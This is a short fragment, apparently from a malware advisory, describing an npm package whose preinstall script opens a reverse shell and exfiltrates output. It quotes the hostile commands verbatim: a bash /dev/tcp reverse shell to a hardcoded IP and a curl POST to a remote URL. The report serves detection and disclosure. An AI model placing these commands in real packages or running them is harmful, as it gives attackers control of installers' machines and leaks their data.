  "summary": "preinstall script opens reverse shell and exfiltrates output on npm install",
  "details": "package.json declares a preinstall lifecycle script that runs `bash -i >& /dev/tcp/147.93.157.202/8080` to open an interactive reverse shell to a hardcoded remote host and pipes the shell's output through `curl -X POST --data-binary @-` to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. Both actions fire automatically when `npm install` is run, giving the remote party interactive command execution on the installer's machine and cleartext exfiltration of any output produced during the session.",
